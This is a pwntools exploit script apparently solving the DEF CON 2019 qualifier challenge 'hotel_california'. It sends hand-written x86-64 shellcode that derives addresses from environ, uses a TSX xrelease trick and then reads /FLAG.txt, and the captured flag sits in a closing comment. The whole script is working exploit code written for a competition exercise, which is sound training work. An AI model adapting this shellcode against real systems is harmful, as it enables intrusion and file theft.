#!/usr/bin/env python2

from pwn import *
import sys
import os

host, port = 'hotelcalifornia.quals2019.oooverflow.io', 7777
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

if local:
    r = process('./hotel_california')
else:
    r = remote(host, port)
context.arch = 'amd64'
magic_at = 0x7fffffffdb04
payload = asm('''
s:
jmp $+0x30
nop;nop;nop;nop;nop;nop;nop;nop;nop
fd:
nop;nop;nop;nop;nop;nop;nop;nop;nop;nop
nop;nop;nop;nop;nop;nop;nop;nop;nop;nop
nop;nop;nop;nop;nop;nop;nop;nop;nop;nop
nop;nop;nop;nop;nop;nop;nop;nop;nop;
  lea rax, [rip+fd]
  mov rdi, rax
  mov rax, qword ptr [rdi] /* rax = bin_addr */
/* environ_ptr - bin_addr = 0x23f8 */
  xor ebp, ebp
  mov bp, 0x23f8
  add rax, rbp
  mov rdi, rax
  mov rax, qword ptr [rdi] /* rax @ environ */
/* magic_at - environ = 0x584 */
  xor ebp, ebp
  mov bp, 0x584
  sub rax, rbp

  mov rbx, rax
  mov rsp, rbx

  mov ebx, dword ptr [rbx]
  lea rdi, [rip+s-69]
  xrelease mov dword ptr [rdi], ebx
''') + asm(shellcraft.cat('/FLAG.txt'))
#  '\xeb\xfe'
print(disasm(payload))
assert '\x00' not in payload
r.send(payload.ljust(1024, '\x90'))
r.shutdown('send')

r.interactive()

# OOO{We haven't had a proper TSX implementation here since nineteen sixty-nine}
